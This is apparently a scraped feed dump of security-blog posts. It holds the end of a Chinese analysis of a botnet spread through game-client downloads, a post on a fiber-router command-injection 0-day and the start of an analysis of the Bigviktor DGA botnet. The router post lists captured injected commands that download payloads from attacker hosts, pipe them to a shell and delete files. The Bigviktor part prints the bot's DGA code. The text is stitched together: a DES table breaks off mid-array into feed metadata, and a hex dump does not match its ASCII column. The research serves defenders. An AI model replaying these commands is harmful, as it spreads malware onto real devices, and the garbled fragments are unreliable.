Bot</p>\n<p>恶意软件的开发者借用了百度统计接口的一些标准字段来上报主机敏感信息，利用百度统计这种常见的网络行为来管理感染主机的活跃情况。因为百度统计服务被大量网站使用，从流量上看是一套合规的浏览器网络行为，所以很难将其区分出来，加大了安全厂商打击的难度。</p>\n<p>恶意程序首先使用一个名为 <strong>DataWork()</strong> 的函数伪造浏览器请求，下载 <strong>hm.js</strong> 脚本。</p>\n  <div align=\"center\"><img width=\"800\" src=\"https://blog.netlab.360.com/content/images/2020/04/cs_abc_baidu_cookie_GET_headers.png\"></div>\n  <div align=\"center\"><img width=\"800\" src=\"https://blog.netlab.360.com/content/images/2020/04/cs_abc_datawork_dl_hm_js.png\"></div>\n<p>保存返回信息中的用户 Cookie 信息 <strong>HMACCOUNT</strong> 到注册表。</p>\n  <div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/cs_abc_baidu_cookie_path.png\"></div>\n  <div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/cs_abc_baidu_cookie_hm.png\"></div>\n<p>通过 <code>http://hm.baidu.com/hm.gif?</code> 接口，恶意程序将提取到的统计脚本的版本信息<code>this.b.v</code>、用户 Cookie 信息、bot_id 和伪造的其它统计信息组包上报，恶意软件开发者使用百度统计的后台可以方便的管理和评估感染用户。</p>\n  <div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/cs_abc_baidu_hm_gif_url.png\"></div>\n</li>\n<li>\n<p>从 <strong>Dat</strong> 资源解密，创建，安装驱动</p>\n<p>检查是否安装了 <code>XxGamesFilter</code> 等私服客户端驱动。</p>\n  <div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/cs_abc_checkGameProtectDriver.png\"></div>\n<p>根据安装情况和操作系统版本选择不同的资源 ID，每一个资源对应不同版本的驱动（32 位系统使用 ID 为 111 或 109 资源，64 位系统使用 ID 为 110 或 112 的资源）。</p>\n  <div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/cs_abc_load_Dat_res.png\"></div>\n<p>资源是简单加密过的，以解密 32 位驱动为例，首先倒转数据顺序，然后逐字节和系统版本数值 32 异或，得到一个 VMP 加壳的驱动文件。</p>\n  <div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/cs_abc_decrypt_Dat_GameGu_32.png\"></div>\n<p>检测是否存在 <code>TeSafe</code> 驱动，如果存在刚中断感染流程。计算 <code>TeSafe+{Computer Name}</code> 的 MD5 值，检测是否存在名为该 MD5 字串的驱动，如果存在说明系统已经被感染过，也会中断感染流程。</p>\n<pre><code>//拼接字串\n+00   54 65 53 61 66 65 2B 57 49 4E 2D 52 48 39 34 50      TeSafe+WIN-RH94P       \n+10   42 46 43 37 34 41 00 00 00 00 00 00 00 00 00 00      BFC74A..........       \n\n//拼接字串的MD5值 \n+00   46 34 36 45 41 30 37 45 37 39 30 33 33 36 32 30      F46EA07E79033620       \n+10   43 45 31 33 44 33 35 44 45 31 39 41 41 43 34 32      CE13D35DE19AAC42       \n</code></pre>\n<p>如果系统 <code>EnableCertPaddingCheck</code> 注册表项关闭，则替换文件末尾 16 字节为随机数据。这样每个感染主机上的样本 HASH 值完全不一样，可以对抗基于 HASH 查杀的方案。</p>\n  <div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/cs_abc_checkEnableCertPaddingCheck.png\"></div>\n  <div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/cs_abc_padding_rand_data_code.png\"></div>\n<p>将驱动程序释放到 TEMP 目录下，文件名为长度为 7 的随机字符串。例如：<code>&#34;C:\\Users\\{User Name}\\AppData\\Local\\Temp\\iiitubl&#34;</code></p>\n<p>注册驱动文件启动服务并检测安装是否成功。</p>\n  <div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/cs_abc_check_drv_install.png\"></div>   \n</li>\n</ul>\n<h3 id=\"3\">阶段3 — 劫持系统进程，下载后续恶意程序</h3>\n<p>驱动运行后会拷贝自己到 <code>Windows/system32/driver/{7个随机字符}.sys</code> ，伪造驱动设备信息为常见的合法驱动，如 <code>fltMgr.sys</code> ，向系统进程 <code>Lassas.exe</code> 和 <code>svchost.exe</code> 注入 DLL 模块。完成整个初始化过程后，就形成了一个驱动和 DLL 模块通过 <strong>DeviceIoControl()</strong> 通信合作来完成作务的工作模式，这是一个驱动级别的下载器。所有敏感的配置信息都保存在驱动内部，DLL 通过调用驱动来获得配置服务器相关信息，根据下载的配置信息去百度贴吧下载其它恶意代码，进行下一阶段的恶意活动。</p>\n<ul>\n<li>\n<p>驱动运行后用APC注入法向系统进程 Lassas.exe 注入 DLL 模块。</p>\n<div align=\"center\"><img width=\"600\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_inject_lsass.png\"></div>\n<div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_inject_apc.png\"></div>\n<div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/lassas_inected_dll_mem_layoout.png\"></div>   \n<div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/lassas_inected_dll_mem_PE_header.png\"></div>   \n</li>\n<li>\n<p>DLL 配合驱动的执行过程。</p>\n<p>DLL 首先尝试创建互斥对象 <code>{12F7BB4C-9886-4EC2-B831-FE762D4745DC}</code> ，防止系统创建多个实例。</p>\n<div align=\"center\"><img width=\"800\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_create_mutex.png\"></div>   \n<p>接着会检查宿住进程是否是 Lsass.exe 或 svchost.exe，确保不是运行在沙箱之类的分析环境中。</p>\n<div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_check_host_process.png\"></div>   \n<p>尝试创建设备 <code>&#34;\\\\.\\F46EA07E79033620CE13D35DE19AAC42&#34;</code> 句柄，建立和驱动模块的通信。</p>\n<div align=\"center\"><img width=\"800\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_open_tesafe.png\"></div>   \n<p>向驱动发送 <strong>0x222084</strong> 设备控制码，获得连接服务器的配置信息。和配置服务器的通信使用 HTTPS+DES 的双重加密方式，配置信息包含三个重要的部分：</p>\n<div align=\"center\"><img width=\"800\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_deviceio_get_init_cfg.png\"></div>   \n<ol>\n<li>\n<p>主机信息上报服务 <code>https://cs.wconf5.com:12709/report.ashx</code>，供 DLL 上报主机基本信息。</p>\n<p>bot id，安装时间等基本信息。</p>\n <div align=\"center\"><img width=\"600\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_collect_host_info_all.png\"></div>   \n<p>是否安装 360 杀毒，是否是虚拟机环境。</p>\n <div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_collect_host_info_vm_av.png\"></div>   \n<p>是否是无盘工作站。</p>\n <div align=\"center\"><img width=\"600\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_collect_host_info_vdisk.png\"></div>   \n<p>上报主机信息使用DES加密，密钥为 <code>HQDCKEY1</code>。</p>\n <div align=\"center\"><img width=\"600\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_submit_hostinfo.png\"></div>   \n</li>\n<li>\n<p>访问 <code>https://cs.wconf5.com:12710/123.html</code> 下载配置信息：</p>\n <div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_get_cfg_123.png\"></div>   \n<p>配置信息依然是变形 DES 加密，解密密钥为 <code>HQDCKEY1</code>。解密后可以看到配置信息使用自定义的格式，两个百度图片为一组，截取有效数据拼接为一个有效文件：</p>\n <div align=\"center\"><img width=\"800\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_cfg_123_decrypted.png\"></div>   \n</li>\n<li>\n<p>配置信息 <code>https://share.weiyun.com/5dSpU6a</code> 功能未知：</p>\n <div align=\"center\"><img width=\"600\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_query_weiyun.png\"></div>   \n<p>所有驱动样本返回的配置信息都包含一个腾讯微云地址，直接访问该地址可以看到若干字符和数字组成的无意义字串。我们在收集到的配置信息中发现，每组数据中的配置信息服务器和微云保存的数据存在特定的模式。以上图为例，访问腾讯微云，获取字符串 <code>cs127</code>，其同组数据中的配置文件服务器的子域为 <code>cs.xxxx.com</code> ，端口为<code>127xx</code>。这看起来像是一种动态生成配置文件服务器地址的策略，推测可能是还在开发阶段的功能，所以样本中并未包含对应代码。</p>\n</li>\n</ol>\n</li>\n</ul>\n<p>完成上述初始化过程后，驱动开始根据配置文件进入真正的功能操作。根据解析的配置文件，dll和驱动模块配合可以完成非常复杂的功能，下面罗列其中一部分功能。</p>\n<ul>\n<li>\n<p>更新驱动文件</p>\n<p>程序会使用另一套算法得到DES解密密钥 <strong><code>HelloKey</code></strong>，最后用 DES 算法解出最终数据：</p>\n  <div align=\"center\"><img width=\"800\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_decrypt_hellokey.png\"></div>   \n</li>\n<li>\n<p>劫持进程ip地址。</p>\n  <div align=\"center\"><img width=\"600\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_hijack_process_ip.png\"></div>   \n</li>\n<li>\n<p>向系统中添加证书</p>\n  <div align=\"center\"><img width=\"600\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_add_root_cert.png\"></div>   \n</li>\n<li>\n<p>下载文件到 TEMP 目录并创建进程。</p>\n  <div align=\"center\"><img width=\"800\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_tmp_create_process.png\"></div>   \n</li>\n<li>\n<p>篡改 DNS配置</p>\n  <div align=\"center\"><img width=\"900\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_setDns.png\"></div>\n</li>\n<li>\n<p>PAC 代理劫持</p>\n  <div align=\"center\"><img width=\"600\" src=\"https://blog.netlab.360.com/content/images/2020/04/dl_drv_hijack_pac.png\"></div>   \n</li>\n</ul>\n<hr>\n<h2 id=\"2dll\">感染方式2 — DLL 劫持</h2>\n<p>感染方式 2 依然是以私服客户端为载体，但是在技术细节上有较大差异。</p>\n<p>登录器下载页面：</p>\n<div align=\"center\"><img width=\"80%\" src=\"https://blog.netlab.360.com/content/images/2020/04/client2_home_page.png\"></div>   \n<p>下载后的登录器：</p>\n<div align=\"center\"><img width=\"80%\" src=\"https://blog.netlab.360.com/content/images/2020/04/clinet2_zip_file.png\"></div>   \n<p>多款类似游戏的私服客户端的组件 <strong>photobase.dll</strong> 被替换成同名的恶意 DLL 文件，恶意 DLL 文件的 PE  Resource 中包含 3 个关键文件：</p>\n<img src=\"https://blog.netlab.360.com/content/images/2020/04/photobase_dll_pe_rsrc.png\" style=\"zoom:80%;\">\n<p>恶意 <strong>photobase.dll</strong> 有两个关键动作：</p>\n<ol>\n<li>\n<p>首先会释放相应架构的恶意驱动程序，然后注册系统服务并启动；</p>\n</li>\n<li>\n<p>然后加载真正的 photobase.dll 文件，并将导出函数转发到真正的 photobase.dll。</p>\n</li>\n</ol>\n<p>后续感染流程同上。 这是一套标准的 DLL 劫持加载方式。</p>\n<h3 id=\"1\">阶段1 — 释放并加载恶意驱动</h3>\n<p>恶意 photobase.dll 文件会首先为即将释放的恶意驱动文件生成一个随机文件名，文件名为 10 个随机字符，文件后缀为 <code>.dat</code>，并把自身 PE Resource 中相应的驱动文件放到 <code>%windir%\\Temp\\</code> 目录下。</p>\n<p>然后为落地的恶意驱动文件注册系统服务，并启动服务：</p>\n<img src=\"https://blog.netlab.360.com/content/images/2020/04/photobase_dll_load_driver.png\" style=\"zoom:70%;\">\n<p>恶意驱动接下来的活动与前面第一种感染方式雷同，即下载、解密并最终加载其他恶意文件。</p>\n<h3 id=\"2photobasedll\">阶段2 — 加载真 photobase.dll</h3>\n<p>在恶意 photobase.dll PE Resource 中的真 photobase.dll 文件的前 2 个字节被置空：</p>\n<img src=\"https://blog.netlab.360.com/content/images/2020/04/photobase_dll_PE_rsrc_real_dll.png\" style=\"zoom:80%;\">\n<p>恶意 photobase.dll 从 PE Resource 中提取这份文件的时候，会把这前 2 个字节以 <code>MZ</code>(PE 文件头) 填充：</p>\n<img src=\"https://blog.netlab.360.com/content/images/2020/04/photobase_dll_fix_PE_file_header.png\" style=\"zoom:60%;\">\n<p>然后，恶意的 photobase.dll 文件会为刚载入的真正的 photobase.dll 文件载入动态链接库、导入相关函数，最后，把真 photobase.dll 中的导出函数转发到自己的导出函数中。部分转发的导出函数如下：</p>\n<img src=\"https://blog.netlab.360.com/content/images/2020/04/part_of_forwarded_funcs.png\" style=\"zoom:80%;\">\n<p>以上面高亮的导出函数 <code>Sqm::AddToStream()</code> 为例，恶意 photobase.dll 中的转发实现如下：</p>\n<img src=\"https://blog.netlab.360.com/content/images/2020/04/forwarded_func.png\" style=\"zoom:70%;\">\n<h2 id=\"\">百度安全团队声明</h2>\n<p>基于海量威胁情报，百度安全反黑产开放平台配合测算出僵尸网络的规模。平台同时启动相关措施，尝试对受僵尸网络控制的用户进行风险提示。在本次联合行动中，通过黑产威胁情报分析、共享、应对等举措，我们对于双枪团伙的作案技术手段、逻辑及规则形成进一步认知。</p>\n<hr>\n<h2 id=\"\">附录</h2>\n<h3 id=\"des\">DES 加解密算法中的自定义转换表：</h3>\n<p>以下转换表不同于大部分 DES 加解密的公开实现，左移位数表与 SBox 表都同于常见 DES 算法实现。</p>\n<pre><code># Permutation and translation tables for DES\n__pc1 = [\n    56, 48, 08:23:21","updatedTime":"2020-08-25 08:23:21","title":"Multiple fiber routers are being compromised by botnets using 0-day","link":"https://blog.netlab.360.com/multiple-fiber-routers-are-being-compromised-by-botnets-using-0-day-en/","description":"<p><em>Author: <a href=\"https://twitter.com/_O_owl\">Yanlong Ma</a>, <a href=\"https://twitter.com/zom3y3\">Genshen Ye</a>, <a href=\"https://twitter.com/IUnKnow84503351\">Lingming Tu</a>, <a href=\"https://twitter.com/SethKingHi\">Ye Jin</a></em></p>\n<p>This is our 3rd IoT 0-day series article, in the past 30 days, we have already blogged about 2 groups targeting DrayTek CPE 0-day here [<a href=\"https://blog.netlab.360.com/two-zero-days-are-targeting-draytek-broadband-cpe-devices-en/\">1]</a>, and Fbot botnet targeting Lilin DVR 0-day here [<a href=\"https://blog.netlab.360.com/multiple-botnets-are-spreading-using-lilin-dvr-0-day-en/\">2]</a>. Apparently while most botnets play catchup games, some have deep resources and probably deep pocket to get hold of the public unknown exploits. Our botnet researchers are fascinated by this and will see if this is a new trend.</p>\n<p>On February 28, 2020, we noticed the Moobot botnet [<a href=\"https://blog.netlab.360.com/the-botnet-cluster-on-185-244-25-0-24-en/\">3]</a> successfully used a new exploit (two steps) to spread.</p>\n<p>On March 17, we confirmed the exploit was a 0-day and reported the result to CNCERT. We also contacted the vendor but was told this problem should not be happening because the default config of the device should not have this issue (the reality is different) so they won’t take this case from us.</p>\n<p>On March 18, the Exploit Database [<a href=\"https://www.exploit-db.com/exploits/48225\">4]</a> website released a Netlink GPON router remote command execution vulnerability PoC, which matches the 0-day vulnerability we observed. However, the PoC lefts out a crucial prerequisite - another vulnerability needs to be used together with this PoC for it to work. So, a successful execution of the injected commands will not have the target device compromised.</p>\n<p>On March 19th, we observed ongoing exploit attempts to propagate Gafgyt botnet samples using the above PoC, and few days later, on March 26, we saw the exploit attempt adopted into Gafgyt bots and bots carried out internet wide scan (worm behavior).<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/04/image1.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/image1.png\" class=\"kg-image\"></a></p>\n<p>Luckily, unlike Moobot, this botnet author was not aware of the aforementioned precondition, so it did not work out as expected and the scans would mostly fail.<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/04/scanner.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/scanner.png\" class=\"kg-image\"></a></p>\n<p>On March 24th, we noticed another wave of exploit attempts to spread the Fbot botnet just like Gafgyt, with same failed outcome(not working).</p>\n<p>Till this day, we have discovered that a total of 9 vendors are affected, it is likely most of the vendors are OEM products of the same original vendor.</p>\n<p>The PoC has been published publicly and various botnets are taking advantage of it already, we informed CNCERT all the details, and we think it is necessary to inform the public this ongoing threat. We are not going to share the vendor name though, as we have no idea if there is going to be any action taken by them.</p>\n<h3 id=\"someoftheinjectedcommand\">Some of the injected command</h3>\n<pre><code>%3Bwget%20http://45.58.148.50/n%20-O-|sh\n%3Bwget%20http://185.61.138.46/n%20-O-|sh\n%3Bwget%20http://194.180.224.13/n%20-O-|sh\n%3Bwget%20http://194.180.224.113/n%20-O-|sh\n;'+payload+'%20/\n;cd /tmp; rm -rf *; busybox wget http://51.254.23.227/bins/n; chmod 777 n; sh n; rm -rf * /\n;cd /tmp; rm -rf *; wget http://51.254.23.227/bins/mips; chmod 777 mips; ./mips; rm -rf * /\n;cd /tmp; rm -rf *; wget http://51.254.23.227/bins/n; chmod 777 n; sh n; rm -rf * /\n;cd /tmp; rm -rf *; wget http://51.254.23.227/bins/netlink; chmod 777 netlink; ./netlink /\n;cd /tmp; rm -rf *; wget http://51.254.23.227/bins/polaris.mips; chmod 777 polaris.mips; ./polaris.mips /\n;cd /tmp; rm -rf *; wget http://6735a55d.ngrok.io/bins/mips; chmod 777 mips; ./mips; rm -rf * /\n;cd /tmp; rm -rf *; wget http://58680dd9.ngrok.io/bins/mips; chmod 777 mips; ./mips; rm -rf * /\n;cd /tmp; rm -rf *; wget http://58680dd9.ngrok.io/bins/sh; chmod 777 sh; sh sh; rm -rf * /\n;cd /tmp; rm -rf mips; wget http://164.132.92.168:6479/bins/mips; busybox wget http://164.132.92.168:6479/bins/mips; chmod 777 mips; ./mips /\n;cd /tmp; rm -rf viktor.mips; wget http://164.132.92.168:6479/bins/viktor.mips; busybox wget http://164.132.92.168:6479/bins/viktor.mips; chmod 777 viktor.mips; ./viktor.mips /\n;ls /\n;wget http://194.180.224.249/bignigger\n;wget http://194.180.224.249/muck.sh -O - | sh\n</code></pre>\n<h3 id=\"vulnerabilityanalysis\">Vulnerability analysis</h3>\n<h4 id=\"prerequisite\">Prerequisite</h4>\n<p>As we mentioned above, just utilizing the PoC will not have the desired result, a successful execution needs 2 steps, the first step involves another vulnerability. We are not going to share this part publicly.</p>\n<h4 id=\"theexploitdbpoc\">The Exploitdb PoC</h4>\n<p>Vulnerability Type: remote command execution<br>\nDetails: The function <code>formPing()</code> in the Web server program <code>/bin/boa</code>, When it processes the post request from <code>/boaform/admin/forming</code>, it did not check the <code>target_addr</code> parameters before calling the system ping commands, thereby a command injection becomes possible.<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/04/ping.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/ping.png\" class=\"kg-image\"></a></p>\n<h3 id=\"suggestions\">Suggestions</h3>\n<p>We recommend that users check and update their device firmwares in a timely manner, and check whether there are default accounts that should be disabled.</p>\n<p>We recommend the following IoCs to be monitored and blocked on the networks where it is applicable.</p>\n<p>For users using our DNSmon system, all the Domains have been automatically blocked.</p>\n<h3 id=\"contactus\">Contact us</h3>\n<p>Readers are always welcomed to reach us on <a +0000","feedId":9360,"bgimg":"https://blog.netlab.360.com/content/images/2020/04/image1.png","linkMd5":"3d194eb49bf27579a9ea4b7294885a2e","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn21@2020_5/2020/08/25/00-23-23-953_5482b4a60ad12736.webp","destWidth":1898,"destHeight":390,"sourceBytes":89256,"destBytes":89574,"author":"Genshen Ye","articleImgCdnMap":{"https://blog.netlab.360.com/content/images/2020/04/image1.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn21@2020_5/2020/08/25/00-23-23-953_5482b4a60ad12736.webp","https://blog.netlab.360.com/content/images/2020/04/scanner.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn85@2020_4/2020/08/25/00-23-34-285_287ebf3387314a55.webp","https://blog.netlab.360.com/content/images/2020/04/ping.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn41@2020_6/2020/08/25/00-23-28-237_6aa4f921bb43ec6a.webp"},"publishedOrCreatedDate":1598315001053},{"createdTime":"2020-08-25 08:23:21","updatedTime":"2020-08-25 08:23:21","title":"The new Bigviktor Botnet is Targeting DrayTek Vigor Router","link":"https://blog.netlab.360.com/bigviktor-dga-botnet/","description":"<h2 id=\"overview\">Overview</h2>\n<p>On June 17, 2020, 360Netlab Threat Detecting System flagged an interesting ELF sample (<code>dd7c9d99d8f7b9975c29c803abdf1c33</code>), further analysis shows that this is a DDos Bot program that propagates through the <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-8515\">CVE-2020-8515</a> vulnerability which targets the DrayTek Vigor router device, and it uses DGA (Domain generation algorithm) to generate C2 domain names.</p>\n<p>The program uses &#34;viktor&#34; as file name (<code>/tmp/viktor</code>)  in the propagation process, also a special string <code>0xB16B00B5</code>(big boobs) was used in the sample , we combined the two and named it <strong>Bigviktor</strong>.</p>\n<p>From the network’s perspective, Bigviktor’s DGA generates 1000 domain names every month, and traverses the 1000 domain names by requesting RC4 encryption &#38; ECSDA256 signed <strong>s.jpeg</strong> , When a live C2 responses the request, bot then takes the next step to request for <strong>image.jpeg</strong> from C2 to get more instructions.</p>\n<p>Bigviktor supports 8 kinds of instructions, which can be divided into 2 major functions</p>\n<p>•\tDDoS attack<br>\n•\tSelf-renewal</p>\n<p>The overall network structure is shown in the figure,</p>\n<p><a href=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_brief.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_brief.png\" class=\"kg-image\"></a></p>\n<h2 id=\"botnetscale\">Botnet scale</h2>\n<h3 id=\"dailyactivebot\">Daily Active Bot</h3>\n<p>DGA is a double-edged sword. While giving the author good chance to evade detection, it also gives security researcher the opportunity to register domain names to hijack infected hosts of botnets.<br>\nWe registered several domains names generated by Bigviktor in June and July (<code>workfrequentsentence.club</code> , <code>waitcornermountain.club</code>), so we were able to tap into it network to measure the scale of the Botnet. As of now we only see about 900 active infected IPs. However, When taking a look at the requests of Bigviktor DGA domain name, we can see the trend is steadily going up. Its daily active Bot trend is shown in the figure below:</p>\n<p><a href=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor.dns.req.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor.dns.req.m.png\" class=\"kg-image\"></a></p>\n<h3 id=\"botgeographiclocation\">Bot geographic location</h3>\n<p>The IP area distribution of infected devices is as follows:<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/07/bigvictor.geo.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/07/bigvictor.geo.m.png\" class=\"kg-image\"></a><br>\nThe main ASN distribution of these IPs is as follows:</p>\n<pre><code>412\tAS45899|VNPT_Corp\n194\tAS7552|Viettel_Group\n190\tAS18403|The_Corporation_for_Financing_&#38;_Promoting_Technology\n90\tAS3462|Data_Communication_Business_Group\n82\tAS15525|Servicos_De_Comunicacoes_E_Multimedia_S.A.\n66\tAS8151|Uninet_S.A._de_C.V.\n52\tAS45903|CMC_Telecom_Infrastructure_Company\n34\tAS3352|Telefonica_De_Espana\n28\tAS17552|True_Internet_Co.,Ltd.\n22\tAS8881|1&#38;1_Versatel_Deutschland_GmbH\n</code></pre>\n<h3 id=\"infecteddevice\">Infected device</h3>\n<p>By obtaining the title of the infected device's 80, 8080, and 443 port web pages, we know that the currently distributed version of the infected DrayTek Vigor router is:</p>\n<pre><code>269 Vigor 2960\n107 Vigor 3900\n87  Vigor 300B  \n</code></pre>\n<h2 id=\"reverseanalysis\">Reverse analysis</h2>\n<p>We have captured a total of 2 versions. The first version of the bot program seems to have bugs and cannot run normally. This article uses the latest version as an example for reverse analysis.</p>\n<pre><code>MD5:dd7c9d99d8f7b9975c29c803abdf1c33\nELF 32-bit LSB executable, ARM, version 1 (SYSV), statically linked, stripped\nPacker: None\n</code></pre>\n<p>Generally speaking, the Bigviktor function is relatively simple. It binds a local port at runtime to implement a single instance, uses the RC4 algorithm to decrypt sensitive resources, including the strings to be used by DGA, and then uses DGA to generate 1000 C2 domain names based on these strings. Then the bot uses the libcurl library to send a request to the built-in legit websites to test network connectivity. If the network is up, it moves on to next step to request the s.jpeg from the C2 domain to verify the legitimacy of C2; after passing the legality test, it goes to final step to request the male.jpeg and image.jpeg resources from the C2 domain to conduct DDos attack.</p>\n<p>We can roughly divide the bot behaviors into two categories: auxiliary behavior and malicious behavior, let us take a close look.</p>\n<h2 id=\"auxiliarybehavior\">Auxiliary behavior</h2>\n<h4 id=\"1uselibcurllibrarytoaccessnetworkresources\">1: Use libcurl library to access network resources</h4>\n<pre><code>DNS Option:\n    1.1.1.1,8.8.8.8\nUser-Agent Option:\n    Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&#34;\nAccept Option:\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n</code></pre>\n<h4 id=\"2bindport61322toimplementasingleinstance\">2: Bind port 61322 to implement a single instance</h4>\n<p><a href=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_single.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_single.png\" class=\"kg-image\"></a></p>\n<h4 id=\"3rc4encryptssensitiveresourcestheresourcesincludethestingsrequiredbydgalegitwebsitesupgradefilestoragepathetc\">3: RC4 encrypts sensitive resources, the resources include the stings required by DGA, legit websites, upgrade file storage path, etc.</h4>\n<p><a href=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_rc.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_rc.png\" class=\"kg-image\"></a><br>\nThe RC4 key is</p>\n<pre><code>DA B2 F1 F7 32 FD 03 BA 58 DB FF 53 8B F2 6F 01 \n02 FF 00 01 03 05 00 DE 02 FF 00 01 7C DF 92 91\n</code></pre>\n<p>Take the suffixes required by DGA to generate domain as an example, the ciphertext is as follows</p>\n<pre><code>00000000  34 f5 96 77 11 66 35 4f 00 00 00 00 00 00 00 00 00 00 00 00 00  |net.............|\n000000a0  6e 6c 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |nl..............|\n000000b0  6f 62 73 65 72 76 65 72 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |xyz.............|\n</code></pre>\n<h4 id=\"4accessalegitwebsitetotestnewtorkconnectivityandobtainthecurrentdate\">4: Access a legit website to test newtork connectivity and obtain the current date</h4>\n<p><a href=\"https://blog.netlab.360.com/content/images/2020/07/bikviktor_white.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/07/bikviktor_white.png\" class=\"kg-image\"></a><br>\nThe legit websites can be decrypted by RC4, and we got the following sites</p>\n<pre><code>jd.com　　　　　　　　　weibo.com                 vk.com\ncsdn.net              okezone.com               office.com\nxinhuanet.com         babytree.com              livejasmin.com\ntwitch.tv             naver.com                 aliexpress.com\nstackoverflow.com     tribunnews.com            yandex.ru\nsoso.com　　　　　　　 msn.com                   facebook.com\nyoutube.com　　　　　　baidu.com                 en.wikipedia.org  \ntwitter.com           amazon.com                imdb.com\nreddit.com            pinterest.com             ebay.com\ntripadvisor.com       craigslist.org            walmart.com\ninstagram.com         google.com                nytimes.com\napple.com             linkedin.com              indeed.com\nplay.google.com       espn.com                  webmd.com\ncnn.com               homedepot.com             etsy.com\nnetflix.com           quora.com                 microsoft.com\ntarget.com            merriam-webster.com       forbes.com\ntmall.com             baidu.com                 qq.com\nsohu.com              taobao.com                360.cn\ntianya.cn\n</code></pre>\n<p>Visit one of these URLs to get the current date, which will be used in DGA.</p>\n<pre><code>format          %a, %d %b %Y\nFri, 10 Jul 2020\n</code></pre>\n<h2 id=\"maliciousbehavior\">Malicious behavior</h2>\n<h4 id=\"1usethec2domainnamegeneratedbydga\">1: Use the C2 domain name generated by DGA</h4>\n<p>The format of the domain name is<code>[prefix.]verbe[-]adjective[-]noun.surfix</code>, the content in [] indicates optional, theprefix has 40 words, the verbe has 100 words, the adjective has 525 words, noun has 1522 words, and surfix has 20 words. The algorithm is implemented as follows</p>\n<pre><code> void GenNewKey(uint32_t &#38;key)\n {\n \tuint32_t tmp = key ^ (key &#60;&#60; 13) ^ ((key ^ (uint32_t)(key &#60;&#60; 13)) &#62;&#62; 17);\n \tkey = tmp ^ 32 * tmp;\n };\t\n \tstring c2url;\n \tGenNewKey(seed);\n //1:prefix part\n \tif (seed % 5 == 0)\n \t{\n \t\tGenNewKey(seed);\n \t\tc2url += prefix[seed % 40];\n \t\tc2url += &#34;.&#34;;\n \t}\n //2:verbe part\n \tGenNewKey(seed);\n \tc2url += verbe[seed % 100];\n \tGenNewKey(seed);\n \tif (seed % 10 &#60;= 1)\n \t\tc2url += &#34;-&#34;;\n //3:adj part\n \tGenNewKey(seed);\n \tc2url += adj[seed % 525];\n \tGenNewKey(seed);\n \tif (seed % 10 &#60;= 1)\n \t\tc2url += &#34;-&#34;;\n //4:noun part\n \tGenNewKey(seed);\n \tc2url += noun[seed % 1522];\n \tc2url += &#34;.&#34;;\n //5:surfix part\n \tGenNewKey(seed);\n \tc2url += surfix[seed % 20];\n</code></pre>\n<p>The current date converts into a string with format<code>%b %Y 00:00</code> and the initial key is the first 4 bytes of the SHA256 value of the string, for example</p>\n<pre><code>currtent date: Fri, 10 Jul 2020\nformat\t----&#62;Jul 2020 